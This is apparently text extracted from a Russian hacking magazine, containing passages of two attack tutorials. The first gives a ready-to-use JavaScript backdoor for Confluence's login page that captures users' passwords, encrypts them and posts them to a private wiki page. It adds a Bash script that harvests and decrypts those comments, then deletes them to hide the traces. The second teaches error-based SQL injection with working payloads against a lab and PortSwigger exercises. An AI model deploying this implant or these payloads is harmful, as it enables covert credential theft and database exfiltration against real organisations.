

               // Отправка зашифрованных данных на сервер Confluence
               const response = await fetch("<
ВСТАВИТЬ_URL_CONFLUENCE>/rest/api/content", {
                   method: "POST",
                   headers: {
                       "Content-Type": "application/json",
                       // Basic-авторизация для доступа к API
Confluence
                       "Authorization": "Basic " + btoa("<
ВСТАВИТЬ_ЛОГИН_СОЗДАННОГО_ПОЛЬЗОВАТЕЛЯ>:<
ВСТАВИТЬ_ПАРОЛЬ_СОЗДАННОГО_ПОЛЬЗОВАТЕЛЯ>")
                   },
                   credentials: "omit", // Не отправляем cookies
                   body: JSON.stringify({
                           // Тип контента — комментарий
                       type: "comment",
                       container: {
                               // ID страницы для привязки
комментария
                           id: "<ВСТАВИТЬ_ID_ПРИВАТНОЙ_WIKI_СТРАНИЦЫ>
",
                           type: "page",
                           status: "current"
                       },
                       body: {
                           storage: {
                                   // Зашифрованные данные в Base64
                               representation: "storage"
                               value: encryptedBase64,
                           }
                       }
                   })
               });


               console.log("Время окончания:", new Date().
toLocaleTimeString());
               console.log("Ответ сервера:", response.status,
response.statusText);


               // Обработка успешного ответа
               if (response.ok) {
                   const data = await response.json();
                   console.log("[ШАГ 1/2] Зашифрованные данные
успешно отправлены!");
                   console.log("ID комментария:", data.id);
               } else {
                   console.error("Ошибка сервера:", response.status);
               }


           } catch (err) {
               console.error("Ошибка при отправке зашифрованных
данных:", err);
           }


           // ВАЖНО: отправляем форму только после завершения
отправки зашифрованных данных
           console.log("[ШАГ 2/2] Теперь отправляем форму логина...")
;
           console.log("Время отправки формы:", new Date().
toLocaleTimeString());


           // Удаляем обработчик, чтобы форма отправилась штатно
           loginForm.removeEventListener('submit', arguments.callee);


           // Отправляем форму на сервер для авторизации
           loginForm.submit();


           return false;


       }, true); // Используем capture phase для перехвата события


       console.log("Перехватчик установлен на форму");
       console.log("Инициализация завершена!");
       console.log("Порядок выполнения гарантирован:");
       console.log("   1. Отправка зашифрованных данных");
       console.log("   2. Отправка формы логина");


   } catch (err) {
       console.error("Ошибка инициализации:", err);
   }
});

Этот шаблон универсален, его можно использовать от проекта к проекту.
Единственное — его следует как минимум минифицировать, а лучше даже
обфусцировать. Пример минифицированного варианта JS-бэкдора — ниже.
   Тебе нужно будет подставить подходящие значения в следующие места:
 • <ВСТАВИТЬ_ПУБЛИЧНЫЙ_КЛЮЧ_ШИФРОВАНИЯ> —  RSA-публичный ключ
   в base64 без PEM-заголовков -----BEGIN PUBLIC KEY----- и -----
  END PUBLIC KEY----- ;
 • <ВСТАВИТЬ_URL_CONFLUENCE> — URL сервера Confluence (например,
  https://confluence.example.com  или  https://example.com/
  confluence );
 • <ВСТАВИТЬ_ЛОГИН_СОЗДАННОГО_ПОЛЬЗОВАТЕЛЯ> — логин созданной
   пользовательской учетной записи;
 • <ВСТАВИТЬ_ПАРОЛЬ_СОЗДАННОГО_ПОЛЬЗОВАТЕЛЯ> —  пароль   соз‐
   данной пользовательской учетной записи;
 • <ВСТАВИТЬ_ID_ПРИВАТНОЙ_WIKI_СТРАНИЦЫ>  —    ID    приватной
   вики‑страницы в Confluence.

В нашем случае:
 • логин  и  пароль  созданного  тестового  пользователя —  backup:
  Backup_password! ;
 • идентификатор созданной приватной страницы — 1277955 ;
 • актуальное  значение  публичного  ключа  шифрования — MIIBIj...
  ywIDAQAB ;
 • URL сервера Confluence — http://localhost:8090 .

Заполненный шаблон будет выглядеть так:


<script type="text/javascript">document.addEventListener("
DOMContentLoaded",async function(){const e="
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxXVFzAg2ibohYN5YJl3O9LSMO
LjguPWIIxhr2ZHIzqBBKgTcMIFsn1tACSvF8q1GHvPLN+Ac1IGRCcXI1ttEo2jFZD+w9N
XAuYY9t8Dlb0F7JLeLxrsWJuN6kTTvIXC+UfPrO87EETGN5hP++0zAIwKkp5BHn86iXWF
AVTB7tSaHnptt58HF2LvJSQKZP1QqLFaGIe0UWmdALKDK9dyt0zSjW9l01XYTuPgRi3ep
LBSuOr9G7wfwdWkx74xDknsMmCq5A5iTf8r+ALxWv8MexZA1iZiN/
LeXy4TMt9pK5KyZYwaIR6J+XPEUG21eedKMDpjSgN5Ea4BOLkw2FzDcywIDAQAB";
function t(e){let t="";const n=new Uint8Array(e);for(let e=0;e<n.
byteLength;e++)t+=String.fromCharCode(n[e]);return window.btoa(t)}
async function n(e){const t=atob(e),n=new Uint8Array(t.length);for(
let e=0;e<t.length;e++)n[e]=t.charCodeAt(e);return await crypto.
subtle.importKey("spki",n.buffer,{name:"RSA-OAEP",hash:{name:"SHA-256
"}},!0,["encrypt"])}async function o(e,t){const n=new TextEncoder().
encode(e);return await crypto.subtle.encrypt({name:"RSA-OAEP"},t,n)}
try{const a=await n(e),r=document.forms.loginform||document.
querySelector('form[name="loginform"]'),s=document.getElementById("
loginButton");if(!r||!s)return;let c=!1;r.addEventListener("submit",
async function i(e){if(e.preventDefault(),e.stopImmediatePropagation
(),c)return!1;c=!0;const n=document.getElementById("os_username"),s=
document.getElementById("os_password");if(!n||!s)return r.submit(),!1
;const l=n.value,u=s.value;if(!l||!u)return r.submit(),!1;const d=`${
l}:${u}`;try{const e=await o(d,a),n=t(e);await fetch("http://
localhost:8090/rest/api/content",{method:"POST",headers:{"
Content-Type":"application/json",Authorization:"Basic "+btoa("backup:
Backup_password!")},credentials:"omit",body:JSON.stringify({type:"
comment",container:{id:"1277955",type:"page",status:"current"},body:{
storage:{value:n,representation:"storage"}}})})}catch(e){}return r.
removeEventListener("submit",i),r.submit(),!1},!0)}catch(e){}});</
script>

Именно его нам и нужно будет внедрить в Confluence.


ВНЕДРЯЕМ JAVASCRIPT-БЭКДОР

Логинимся от имени любой админской учетки и идем в основные настройки
сервера Confluence.





Пролистываем страницу вниз, пока не увидим пункт «Пользовательский
HTML», и нажимаем на него. Проверяем, что попали на нужную страницу нас‐
троек сервера Confluence, где можно добавить пользовательский HTML-код
в теги head и body .





Жмем кнопку «Изменить», вставляем в поле «в конце HEAD» заполненный
шаблон JS-бэкдора и нажимаем «Сохранить».





Обновляем страницу и убеждаемся, что наш JS-имплант сохранился в нас‐
тройках сервера Confluence.





Теперь нужно убедиться, что наш JS-имплант успешно встроен в страницу
аутентификации пользователей.





После внедрения JS-бэкдора нужно проверить, как он работает: для этого
входим под нашей же «технической» учеткой.





После успешного входа в профиль переходим на созданную ранее приватную
страницу и убеждаемся, что здесь появился новый комментарий.





Пробуем вручную расшифровать содержимое этого комментария.





И убеждаемся, что нам удалось полностью восстановить логин и пароль
нашего пользователя из зашифрованного комментария.
   Осталось настроить автоматический сбор комментариев и их последу‐
ющее удаление.


             INFO

                         Приступай к автоматизации сбора логов только
                           после того, как успешно расшифруешь коммента‐
                        рий,  оставленный  JS-имплантом  на  сервере
                         Confluence.





                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ

     АТАКА У ВОДОПОЯ
               ВНЕДРЯЕМ JS-БЭКДОР
                     В CONFLUENCE





АВТОМАТИЗИРУЕМ СБОР ЛОГОВ JS-БЭКДОРА

Для автоматизации выгрузки, расшифровки и удаления комментариев на сер‐
вере Confluence удобно использовать Bash.


           WARNING

                 В продуктовой среде средства  автомати‐
                    зации обязательны! При каждой аутентифика‐
                      ции   пользователей  на   сервере  Confluence
                        с логином и паролем эти данные будут попадать
                       на нашу приватную страницу в виде коммента‐
                        риев. Комментариев может накопиться много, что
                            плохо скажется и на OPSEC, и на производитель‐
                            ности сервера Confluence.


Вот вариант такого Bash-скрипта:


#!/bin/bash


# Значения по умолчанию
DEFAULT_SLEEP_INTERVAL= 60
DEFAULT_JITTER= 5


# Функция для вывода справки
show_help() {
    cat << EOF
Использование: $0 [ОПЦИИ]


Скрипт для получения, расшифровки и удаления комментариев со
страницы Confluence.


Опции:
    -u, --url URL               URL-адрес сервера Confluence (
обязательный)
    -p, --page-id ID            Идентификатор страницы Confluence (
обязательный)
    -a, --auth LOGIN:PASSWORD   Данные аутентификации (обязательный)
    -k, --key PATH              Путь к приватному ключу для
расшифровки (обязательный)
    -i, --interval SECONDS      Интервал между запросами (по
умолчанию: $DEFAULT_SLEEP_INTERVAL)
    -j, --jitter SECONDS        Максимальное отклонение от
интервала (по умолчанию: $DEFAULT_JITTER)
    -o, --output-dir PATH       Директория для сохранения файлов (по
умолчанию: текущая)
    -h, --help                  Показать эту справку


Примеры:
    $0 -u https://confluence.example.com -p 12345 -a user:pass -k /
path/to/key.pem
    $0 --url https://confluence.example.com --page-id 12345 --auth
user:pass --key /path/to/key.pem --interval 30 --jitter 10


EOF
    exit 0
}


# Функция для вывода сообщений с временной меткой
log () {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}


# Проверка наличия утилиты jq
check_dependencies() {
    if ! command -v jq &> /dev/null; then
        log "ОШИБКА: Утилита jq не найдена!"
        log "Установите ее с помощью:"
        log "  Ubuntu/Debian: sudo apt install jq"
        log "  CentOS/RHEL:   sudo yum install jq"
        log "  macOS:         brew install jq"
        exit 1
    fi
    log "Проверка зависимостей пройдена. jq найден: $(which jq)"
}


# Проверка обязательных параметров
validate_params() {
    local errors= 0


    if [ -z "$CONFLUENCE_URL" ]; then
        log "ОШИБКА: Не указан URL Confluence (-u, --url)"
        ((errors++))
    fi


    if [ -z "$PAGE_ID" ]; then
        log "ОШИБКА: Не указан ID страницы (-p, --page-id)"
        ((errors++))
    fi


    if [ -z "$AUTH" ]; then
        log "ОШИБКА: Не указаны данные аутентификации (-a, --auth)"
        ((errors++))
    fi


    if [ -z "$PRIVATE_KEY" ]; then
        log "ОШИБКА: Не указан путь к приватному ключу (-k, --key)"
        ((errors++))
    elif [ ! -f "$PRIVATE_KEY" ]; then
        log "ОШИБКА: Файл приватного ключа не найден: $PRIVATE_KEY"
        ((errors++))
    fi


    if [ -n "$OUTPUT_DIR" ] && [ ! -d "$OUTPUT_DIR" ]; then
        log "ОШИБКА: Директория для вывода не существует: $OUTPUT_DIR
"
        ((errors++))
    fi


    if [ $errors -gt 0 ]; then
        echo ""
        log "Используйте -h или --help для получения справки"
        exit 1
    fi
}


# Функция для генерации случайного jitter
get_jitter() {
    local max_jitter=$1
    echo $(( (RANDOM % (max_jitter * 2 + 1)) - max_jitter ))
}


# Функция для обработки комментариев со страницы Confluence
process_comments() {
    log "Выполняется запрос к Confluence..."


    # Формируем URL для получения комментариев через REST API
    URL="${CONFLUENCE_URL}/rest/api/content/${PAGE_ID}/child/
comment?expand=body.view,version,history&depth=all"


    # Выполняем GET-запрос для получения комментариев
    RESPONSE=$(curl -s -u "$AUTH" "$URL" -k)
    if [ $? -ne 0 ]; then
        log "ОШИБКА: Не удалось выполнить запрос к серверу"
        return
    fi


    log "Ответ от сервера получен"


    # Парсим JSON-ответ
    PARSED_RESPONSE=$(echo "$RESPONSE" | jq -c '.results[] | {id: .
id, value: .body.view.value, created: .history.createdDate,
lastUpdated: .version.when}' 2>/dev/null)
    if [ $? -ne 0 ]; then
        log "Нет комментариев для обработки или ошибка парсинга JSON"
        return
    fi


    if [ -z "$PARSED_RESPONSE" ]; then
        log "Комментарии не найдены"
        return
    fi


    COMMENT_COUNT=$(echo "$PARSED_RESPONSE" | wc -l)
    log "Найдено комментариев: $COMMENT_COUNT"


    echo "$PARSED_RESPONSE" | while IFS= read -r line ; do
        ID=$(echo "$line" | jq -r '.id')
        VALUE=$(echo "$line" | jq -r '.value')
        CREATED=$(echo "$line" | jq -r '.created // empty')
        LAST_UPDATED=$(echo "$line" | jq -r '.lastUpdated // empty')


        if [ -z "$ID" ] || [ -z "$VALUE" ]; then
            log "Пропуск комментария: отсутствует ID или значение"
            continue
        fi


        log "Обработка комментария ID: $ID"


        if [ -n "$CREATED" ]; then
            COMMENT_DATE="$CREATED"
        elif [ -n "$LAST_UPDATED" ]; then
            COMMENT_DATE="$LAST_UPDATED"
        else
            COMMENT_DATE="неизвестно"
        fi


        # Сохраняем сырой комментарий
        echo "--- Комментарий ID: $ID ---" >> "$RAW_FILE"
        echo "Дата создания (Confluence): $COMMENT_DATE" >> "
$RAW_FILE"
        echo "Дата получения (локальная): $(date '+%Y-%m-%d %H:%M:%S'
)" >> "$RAW_FILE"
        echo "Содержимое:" >> "$RAW_FILE"
        echo "$VALUE" >> "$RAW_FILE"
        echo "" >> "$RAW_FILE"


        # Декодируем и расшифровываем
        DECRYPTED_CONTENT=$(echo "$VALUE" | base64 -d 2>/dev/null |
openssl pkeyutl -decrypt -inkey "$PRIVATE_KEY" -pkeyopt rsa_padding_
mode:oaep -pkeyopt rsa_oaep_md:sha256 2>/dev/null)


        if [ $? -ne 0 ] || [ -z "$DECRYPTED_CONTENT" ]; then
            log "ОШИБКА: Не удалось расшифровать комментарий $ID"
            continue
        fi


        # Сохраняем расшифрованный комментарий
        echo "--- Комментарий ID: $ID | $(date '+%Y-%m-%d %H:%M:%S')
---" >> "$DECRYPTED_FILE"
        echo "$DECRYPTED_CONTENT" >> "$DECRYPTED_FILE"
        echo "" >> "$DECRYPTED_FILE"


        # Выводим в консоль
        log "Расшифрованное содержимое комментария $ID:"
        echo "────────────────────────────────────────"
        echo "$DECRYPTED_CONTENT"
        echo "────────────────────────────────────────"


        # Удаляем комментарий с сервера
        DELETE_URL="${CONFLUENCE_URL}/rest/api/content/${ID}"
        curl -X DELETE -s -u "$AUTH" "$DELETE_URL" -k
        if [ $? -ne 0 ]; then
            log "ОШИБКА: Не удалось удалить комментарий $ID"
            continue
        fi


        log "Комментарий $ID успешно обработан и удален"
    done
}


# Парсинг аргументов командной строки
while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            CONFLUENCE_URL="$2"
            shift 2
            ;;
        -p|--page-id)
            PAGE_ID="$2"
            shift 2
            ;;
        -a|--auth)
            AUTH="$2"
            shift 2
            ;;
        -k|--key)
            PRIVATE_KEY="$2"
            shift 2
            ;;
        -i|--interval)
            SLEEP_INTERVAL="$2"
            shift 2
            ;;
        -j|--jitter)
            JITTER="$2"
            shift 2
            ;;
        -o|--output-dir)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            log "ОШИБКА: Неизвестный параметр: $1"
            log "Используйте -h или --help для получения справки"
            exit 1
            ;;
    esac
done


# Устанавливаем значения по умолчанию, если не заданы
SLEEP_INTERVAL=${SLEEP_INTERVAL:-$DEFAULT_SLEEP_INTERVAL}
JITTER=${JITTER:-$DEFAULT_JITTER}
OUTPUT_DIR=${OUTPUT_DIR:-.}


# Проверяем зависимости и параметры
check_dependencies
validate_params


# Формируем имена файлов
START_TIME=$(date '+%Y%m%d_%H%M%S')
RAW_FILE="${OUTPUT_DIR}/comments_raw_${START_TIME}.txt"
DECRYPTED_FILE="${OUTPUT_DIR}/comments_decrypted_${START_TIME}.txt"


# Выводим информацию о запуске
log "Скрипт запущен"
log "URL Confluence: $CONFLUENCE_URL"
log "ID страницы: $PAGE_ID"
log "Приватный ключ: $PRIVATE_KEY"
log "Базовый интервал между запросами: ${SLEEP_INTERVAL} сек"
log "Jitter (случайное отклонение): ±${JITTER} сек"
log "Файл сырых комментариев: $RAW_FILE"
log "Файл расшифрованных комментариев: $DECRYPTED_FILE"
echo ""


# Бесконечный цикл
while true; do
    process_comments


    CURRENT_JITTER=$(get_jitter $JITTER)
    ACTUAL_INTERVAL=$((SLEEP_INTERVAL + CURRENT_JITTER))


    if [ $ACTUAL_INTERVAL -lt 1 ]; then
        ACTUAL_INTERVAL= 1
    fi


    NEXT_REQUEST_TIME=$(date -d "+${ACTUAL_INTERVAL} seconds"
'+%Y-%m-%d %H:%M:%S')


    echo ""
    log "Ожидание ${ACTUAL_INTERVAL} сек (базовый: ${SLEEP_INTERVAL}
, jitter: ${CURRENT_JITTER})"
    log "Следующий запрос запланирован на: ${NEXT_REQUEST_TIME}"
    echo ""


    sleep $ACTUAL_INTERVAL
done





                    Пример использования скрипта

Так нам удастся сохранить нашу приватную вики‑страницу чистой.
   Этот скрипт удобно использовать для длительного сбора данных, запустив
его в сессии screen. Важно: оставляй его работать в автономном режиме
на сутки и более только после того, как убедишься в корректности полного
цикла. Скрипт должен успешно расшифровывать данные и гарантированно
удалять комментарии с сервера.


ЗАКЛЮЧЕНИЕ

В этой статье мы рассмотрели пример атаки «у водопоя», разобрав техничес‐
кие детали бэкдоринга корпоративной вики. Вспомним основные этапы ата‐
ки:
 • Этап 0 — получение админского доступа к Confluence через эксплоит
   или фишинг.
 • Этап 1 — внедрение бэкдора: JS-имплант встраивается в страницу
   логина через стандартную функцию Custom HTML.
 • Этап 2 — при входе в систему скрипт перехватывает логин и пароль, шиф‐
   рует их через RSA-OAEP и кодирует строку в формат Base64.
 • Этап 3 — зашифрованные учетные данные отправляются на приватную
   вики‑страницу в виде  комментария  от  технической  учетной  записи.
  Для пользователя авторизация выглядит как обычный вход.
 • Этап 4 — атакующий периодически забирает комментарии, расшифро‐
   вывает их локально приватным ключом и удаляет с сервера, заметая сле‐
   ды.

Confluence — лишь частный пример. Эту технику можно применить к любому
веб‑приложению, где удастся внедрить свой код. История с Custom HTML
наглядно показывает, как порой легитимная возможность превращается
в идеальное оружие хакера. © X
ВЗЛОМ





Сегодня я расскажу, как хакеры выкачивают
огромные базы данных, эксплуатируя сооб‐
щения об ошибках. На  конкретных  при‐
мерах ты увидишь, как найти error-based                                                                                         ret0x2A
                                                                                            @ret0x2ASQL injection и как ее эксплуатировать. Поп‐
робуешь разные техники, а в конце прев‐
ратим time-based в error-based при помощи
ошибки конфигурации.


Уязвимость типа error-based SQL injection возникает, когда ты можешь выз‐
вать ошибку в SQL-запросе к базе данных приложения. Существует несколь‐
ко вариантов:
 • Веб‑приложение выводит сообщение об ошибке в интерфейс — наиболее
   простой и быстрый путь. Ты видишь подробное описание ошибки и четко
   понимаешь,  как  будет  выглядеть  запрос.  Данные  выводятся  прямо
   в интерфейс приложения внутри сообщения об ошибке. Почти как при
   union-инъекции.
 • Скрытая error-based-инъекция — сообщение об ошибке неинформатив‐
   ное или вообще отсутствует. Если сообщения нет вообще, твоя задача —
   отследить изменения в ответах сервера. Это может быть разная длина
   ответов или разное время загрузки страницы. Этот тип инъекции похож
   на boolean-based или time-based.


        WWW

                     Для большинства примеров буду использовать
                           собственную лабу. Полный архив с лабой  ска‐
                       чивай  из  моего  GitHub  или  Telegram-канала .
                      Здесь приведу исходные коды веб‑проекта, что‐
                    бы ты мог увидеть ошибки, которые приводят
                          к возникновению инъекции.



ПОИСК ERROR-BASED SQL INJECTION

Если скачал мой архив с лабой, запусти командой docker compose up --
build -d . Если нет, создай PHP-файл с таким содержимым:


<?php
// Отключаем автоматический вывод ошибок, чтобы контролировать вывод
mysqli_report(MYSQLI_REPORT_OFF);
// Подключаемся к MySQL
$db = new mysqli("db", "root", "root", "lab");
// Получаем строку поиска без санитизации
$search = $_GET['q'] ?? '';
// Прямая подстановка параметра в запрос
$sql = "SELECT title, author, year FROM books WHERE title LIKE '%
$search%'";
$result = $db->query($sql);
?>
<h2>Level 1 — Book search (Syntax error-based)</h2>
<form>
    <input type="text" name="q" placeholder="Search book title">
    <button>Search</button>
</form>
<?php
// Простой вывод информации об ошибке на страницу
if (!$result) {
    echo "<pre>SQL Error: " . htmlspecialchars($db->error) . "\n
Query: " . htmlspecialchars($sql) . "</pre>";
    exit;
}
// Вывод в случае успешного поиска
while ($row = $result->fetch_assoc()) {
    echo "{$row['title']} ({$row['year']}) — {$row['author']}<br>";
}

Дополнительно создай базу данных с таблицей books и полями title ,
author, year . Убедись, что все подключается и работает.
   Обнаружить SQL injection ты можешь, подставляя в строку поиска конс‐
трукцию '" . Она передастся в параметре ?q= и без санитизации и фильтра‐
ции подставится в запрос. Если уязвимость есть, одна из кавычек закроет
строковую константу и запрос приобретет такой вид:


SELECT title, author, year FROM books WHERE title LIKE ''"'

Этот кривой запрос MySQL не сможет интерпретировать и вернет ошибку.





                        Пример вывода ошибки


             INFO

                     Два разных вида кавычек потому, что неизвестно,
                        какие   кавычки   использовал   программист.
                     Из практики скажу, что при написании кода один
                      и тот же программист в одном месте может пос‐
                         тавить двойные, а в другом одинарные кавычки.
                         Используя две разные кавычки, ты добьешься,
                           чтобы появилась хотя бы одна «висячая», и уви‐
                    дишь ошибку.


Приложение  вернуло  сообщение об  ошибке,  из  которого  видно,  что
параметр ?q= подставляется в конструкцию LIKE '%%' . Твоя задача — отпра‐
вить пейлоад, который будет синтаксически верным, чтобы MySQL не отбро‐
сил запрос как некорректный. Иначе никакого раскрытия данных не произой‐
дет.
   Проблема в висячей кавычке. Избавиться от нее можно, добавив в пей‐
лоад -- - . Два дефиса говорят SQL воспринимать все дальнейшее как ком‐
ментарий. Важно, чтобы после них стоял пробел. Если отправить просто два
дефиса и пробел, есть шанс, что пробел будет отброшен веб‑сервером. Что‐
бы пробел сохранился, добавляют еще один дефис после пробела.
   Следующая проблема — как получить какие‑то данные? Например, вер‐
сию базы данных. Если использовать пейлоад ' AND @@version, -- - ,
магии не случится. В ошибке ты увидишь макрос, без его отработки:


SQL Error: You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right syntax
to use near ' -- -%'' at line 1
Query: SELECT title, author, year FROM books WHERE title LIKE '%'
AND @@version, -- -%'

На этот случай есть классический пейлоад:


' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e)) -- -

Функция CONCAT заставит MySQL выполнить макрос @@version перед тем,
как попытается объединить строки. Значение 0x7a преобразуется в тильду ~ .
На выходе CONCAT вернет подобную строку: ~5.7.44~. Эта строка попадет
в функцию EXTRACTVALUE, которая предназначена для извлечения данных
из XML по пути XPath. Первым параметром функция принимает валидный XML,
вторым — XPath. Ты же передаешь функции два невалидных значения. Цифра
1 — это явно не XML. Строка ~5.7.44~ — не XPath. Для MySQL это явная
ошибка, о чем он и сообщит. Но главное, что на момент возникновения ошиб‐
ки в EXTRACTVALUE уже получена версия базы данных и она часть ошибки.


Этапы преобразования полезной нагрузки
Когда PHP подставит переменную в запрос, он будет выглядеть так:


SELECT title, author, year
FROM books
WHERE title LIKE '%'
AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e)) -- -%'

MySQL преобразует значения внутри CONCAT:


AND EXTRACTVALUE(1, CONCAT('~', '5.7.44', '~'))

Конкатенированная (объединенная) строка подставляется в EXTRACTVALUE:


AND EXTRACTVALUE(1,'~5.7.44~')

На выходе ты увидишь ошибку с раскрытием версии MySQL.





                Error-based SQL injection раскрыла версию БД

В моей лабе есть таблица users с данными пользователя. Если вместо
@@version подставить (SELECT username FROM users LIMIT 1) , можно
получить  юзернейм  админа.  Затем  поменяй  username  на  password ,
и получишь полные креды админа.





                            Достали ник админа

В жизни информации о базах данных и таблицах тебе никто не расскажет.
Имена баз и таблиц придется узнавать поэтапно:
 1. Пойми, с какой базой данных ты работаешь. MySQL и MS SQL Server вер‐
   нут свою версию через макрос @@version . В PostgreSQL используется
  SELECT  version() .  Oracle  работает  с SELECT  version  FROM
  v$instance или SELECT banner FROM v$version .
 2. Собери информацию о базах, таблицах и столбцах. В MySQL, MS SQL
   Server и PostgreSQL данные лежат в information_schema . Oracle хранит
   информацию в all_tables .
 3. Обладая информацией, выбирай интересную таблицу и вытаскивай дан‐
   ные.

В моем примере уязвимое поле банальное — поисковая строка. Но про‐
верять стоит все параметры и заголовки HTTP-запроса. Значения, которые
вводит пользователь, чаще всего фильтруются. Но, например, система ста‐
тистики может собирать рефереры, юзер‑агенты или какую‑то еще информа‐
цию. Здесь программист может забыть о санитизации и фильтрации ввода.
   Теперь переходим к лабе PortSwigger Visible error-based SQL injection . Она
интересна тем, что уязвимое поле содержится в куках. Запусти веб‑приложе‐
ние и, когда оно будет загружено, обнови страницу. Важно, чтобы к запросам
добавилась кука с TrackingId .
   Настрой проксирование сайта через Burp Suite или меняй куку прямо
в браузере, например через расширение EditThisCookie . Подставь к значению
TrackingId кавычки '" и заново отправь запрос.





                      Ошибка в лабе PortSwigger

Сервер сообщил, что в SQL есть ошибка:


SELECT * FROM tracking WHERE id = 'yv2A0FqjmncfRJxR'"'

Видно, что в коде используются одинарные кавычки. Для теста поменяй '"
на '-- - , чтобы увидеть страницу, загруженную без ошибок.





                     Пейлоад, не вызывающий ошибки

По условиям задачи тебе нужно достать из таблицы users поля username
и password . Если попробуешь использовать пейлоад из предыдущего при‐
мера, тебя ждет сюрприз. Приложение обрезает TrackingId , и запрос ста‐
новится синтаксически неправильным:


SELECT * FROM tracking WHERE id = 'yv2A0FqjmncfRJxR' AND EXTRACTVALUE
(1, CONCAT(0x7e, (SELECT u'

Нужно сделать так, чтобы запрос был синтаксически верным и выполнялся
подзапрос к таблице users . Только после выполнения подзапроса должна
выскочить ошибка.





                      Приложение порезало пейлоад

Для генерации ошибок существует множество техник. Например, приведение
типа. Отправь пейлоад ' AND 1=(SELECT 1)-- , чтобы убедиться в работос‐
пособности подхода. В ответ сервер вернет нормальную страницу сайта
без ошибок. Если попытаешься отправить ' AND 1=(SELECT username FROM
users LIMIT 1)-- , в ответ увидишь ошибку:


ERROR: operator does not exist: integer = character varying
Hint: No operator matches the given name and argument types. You
might need to add explicit type casts.
Position: 43

Лаба использует PostgreSQL. При разборе запроса СУБД видит, что ты пыта‐
ешься сравнить числовой тип со строкой. Ошибка генерируется не на этапе
выполнения, поэтому не происходит раскрытия данных.
  Еще раз подчеркну: твоя задача — вызвать ошибку во время выполнения
запроса. В этом  случае не  обойтись без CAST(...  AS  INT) .  Когда
PostgreSQL доберется до CAST() , он увидит, что ты пытаешься привести зна‐
чение к int. Это устроит интерпретатор, так как логично сравнивать число
с числом. То, что ты будешь приводить строку к числу и можно ли ее вообще
привести, интерпретатор не волнует.
   Итоговый пейлоад:


' AND 1=(SELECT CAST(username AS int) FROM users LIMIT 1)--

Но не забудь удалить лишние символы из TrackingId . При выполнении зап‐
роса PostgreSQL не сможет привести строку к числу, о чем и сообщит в ошиб‐
ке. При этом он выведет саму строку.





                   Успешная атака на лабу PortSwigger

Тебе осталось сделать запрос на получение password , залогиниться от име‐
ни админа, и лаба будет пройдена.
   Попрактиковаться с приведением типов можешь в моей лабе на втором
уровне «Level 2 — Ошибки приведения типов». Здесь тебе потребуется вме‐
шаться в работу вот этого запроса:


SELECT title, author, year FROM books WHERE year > $year




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
    ERROR-BASED SQL
            INJECTION
         КАК ОБРАБОТКА ОШИБОК МОЖЕТ
                   ПОМОЧЬ ХАКЕРУ





СЛЕПАЯ ERROR-BASED SQL INJECTION

Во всех примерах выше у тебя было полноценное сообщение об ошибке,
через которое можно было вытаскивать данные. Почти как при union-based-
инъекции. В слепом варианте сообщение об ошибке просто уведомляет:
что‑то пошло не так. Иногда приложение вообще никак не информирует
пользователя, но с этим тоже можно работать.
    Запусти лабу, перейди в «Level 3 — Слепая инъекция». Введи в поиск '"
и убедись, что запрос ломается. Приложение вернет сообщение: «Произош‐
ла ошибка при выполнении запроса». Оно неинформативно, но ты явно
можешь вмешиваться в запрос. Попробуй отправить ' -- - . Комментирова‐
ние исправит синтаксис, и ошибка исчезнет.
   Осталось понять, как с этим работать. Попробуй выполнить два разных
поиска: ' AND 1=1 -- - и ' AND 1=0 -- - . Обрати внимание на разницу
в ответах. Первое условие верное, и сайт выведет все книги из базы. Второе
условие ложное, сайт не вернет ни одной  книги. Именно так работает
boolean-based-инъекция. Но мы с тобой здесь, чтобы вызывать ошибки!


           WARNING

                   В   этой  лабе   используется   база   данных
                        PostgreSQL, не MySQL. По умолчанию MySQL
                       не воспринимает деление на ноль как ошибку.
                          Встретив выражение 1/0 , он вернет NULL и про‐
                          должит спокойно работать.


Вставь в поиск такую строку:


' AND 1=CAST((SELECT 1 FROM nonexistent) AS int)--

Таблицы nonexistent не существует, поэтому PostgreSQL вернет ошибку.
Если отправишь ' AND 1=CAST((SELECT 1 FROM users LIMIT 1) AS int)-
- , веб‑приложение отработает и вернет полный список книг.
  Ты уже  уловил логику? Нужно  просто  составить такую  конструкцию,
которая будет возвращать ошибку, если твое предположение оказалось пра‐
вильным. Не спутай, в сообществе пентестеров и хакеров принята именно
такая логика при работе со слепой error-based SQLi — если ошибка, значит,
предположение верное.
   Убедись, что механизм работает:


' AND 1=CAST(CASE WHEN EXISTS(SELECT 1 FROM users WHERE
username='admin') THEN 'abc' ELSE '1' END AS int)--

В ответ получишь ошибку, следовательно, пользователь существует. Исправь
admin на hacker, и ошибка пропадет — значит, пользователя нет в базе дан‐
ных.


             INFO

                           Лаба «Level 4 — Слепая инъекция без сообщения
                      об ошибке» точно такая же, но не выводит сооб‐
                    щение об ошибке. Попробуй те же запросы, что
                      и для третьей лабы, чтобы понять, как работать
                        с такой тихой уязвимостью.



ТУЛЗЫ ДЛЯ РАБОТЫ С SQL INJECTION

Алгоритм ручного чека затратный. Сначала нужно проверить все поля. Затем
надо выяснить, что за база данных используется. Подобрать подходящий
пейлоад. После вытащить список баз данных. По каждой базе запросить таб‐
лицы и столбцы. Только собрав всю эту информацию, ты можешь начать
выкачивать данные. Если сталкиваешься со слепой инъекцией, работа может
занять часы или даже дни.
  Но есть хорошая новость! Пентестеры и хакеры давно разработали удоб‐
ные инструменты для автоматического нахождения уязвимостей. Два самых
популярных — sqlmap и ghauri . Обе программы доступны для установки
в Linux, Mac, Windows. В Kali Linux они предустановлены.
  В работе лучше использовать обе утилиты. Мапа обычно  цепляется,
но бывают моменты, когда sqlmap не видит уязвимости, а ghauri — видит.
Иногда мапа находит только time-based, а ghauri цепляется за boolean-based
или даже error-based, что сильно ускоряет процесс эксфильтрации данных.
   Вот что делают эти утилиты:
 1. Выполняют простой запрос, чтобы был эталон для сравнения.
